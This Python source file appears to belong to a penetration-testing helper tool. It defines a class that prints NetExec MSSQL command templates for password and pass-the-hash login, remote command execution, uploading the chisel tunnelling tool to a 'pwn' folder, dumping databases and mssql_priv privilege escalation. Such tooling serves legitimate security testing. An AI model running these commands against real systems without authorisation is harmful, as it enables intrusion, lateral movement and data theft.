from command.Command import Command
from Util import getarg

class CommandNxcMssql(Command):
    def __init__(self, name: str, config: dict[str, str], tags : list[str]):
        super().__init__(name, config, tags)


    def matchesTrigger(self, trigger : str) -> bool:
        triggerLower = trigger.lower()
        triggers = ['nxc-mssql', 'netexec-mssql', 'cme-mssql', 'crackmapexec-mssql']
        return any(word in triggerLower for word in triggers)


    def getHelp(self) -> str:
        return 'nxc-mssql <target-spec> <user-spec> <auth-spec>'


    def genCommands(self, trigger: str, args: list[str]) -> list[str]:
        commands = []

        targetSpec = getarg(args, 0) or '<target-spec>'
        userSpec = getarg(args, 1) or '<user-spec>'
        authSpec = getarg(args, 2) or '<auth-spec>'

        command = 'whoami /priv'
        localPath = 'chisel64.exe'
        remotePath = 'c:\\windows\\temp\\pwn\\chisel64.exe'

        commands.append('# Basic authentication')
        commands.append('## Using password')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\'')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' -d .')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' --local-auth')
        commands.append('## Using hash')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -H {authSpec}')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -H {authSpec} -d .')
        commands.append('')
        commands.append('# Command execution (as admin)')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' -x \'{command}\'')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' -X \'{command}\'')
        commands.append('')
        commands.append('# File transfer')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' --get-file \'{remotePath}\' {localPath}')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' --put-file {localPath} \'{remotePath}\'')
        commands.append('')
        commands.append('# SQL queries')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' -q "SELECT name FROM master.dbo.sysdatabases"')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' -q "SELECT table_name FROM <database-name>.information_schema.tables"')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' -q "SELECT * FROM <database-name>.dbo.<table-name>"')
        commands.append('')
        commands.append('# Misc')
        commands.append('## Privilege abuse')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' -M mssql_priv -o action=enum_priv')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' -M mssql_priv -o action=privesc')
        commands.append(f'nxc mssql {targetSpec} -u {userSpec} -p \'{authSpec}\' -M mssql_priv -o action=rollback')

        return commands
